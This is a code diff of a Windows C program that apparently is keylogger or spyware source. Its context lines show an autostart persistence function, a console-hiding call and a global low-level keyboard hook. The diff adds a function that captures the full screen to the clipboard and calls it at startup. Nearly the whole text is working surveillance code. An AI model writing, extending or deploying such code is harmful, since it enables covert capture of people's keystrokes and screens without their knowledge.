@@ -117,12 +117,42 @@ void addToAutostart()
 
 }
 
+void getScreenshot()
+{
+    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+
+    HDC dcScreen = GetDC(NULL);
+    HDC dcTarget = CreateCompatibleDC(dcScreen);
+
+    HBITMAP bmpTarget = CreateCompatibleBitmap(dcScreen,cx,cy);
+    HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);
+    BitBlt(dcTarget, 0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);
+
+
+    OpenClipboard(NULL);
+    EmptyClipboard();
+    SetClipboardData(CF_BITMAP, bmpTarget);
+    CloseClipboard();
+
+
+    SelectObject(dcTarget, oldBmp);
+    DeleteDC(dcTarget);
+    ReleaseDC(NULL,dcScreen);
+    DeleteObject(bmpTarget);
+
+}
+
 int main()
 {
     SetConsoleOutputCP(CP_UTF8);
     //hideConsoleWindow();
 
-    addToAutostart();
+    //addToAutostart();
+    getScreenshot();
     capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
     if (hHook == NULL) {
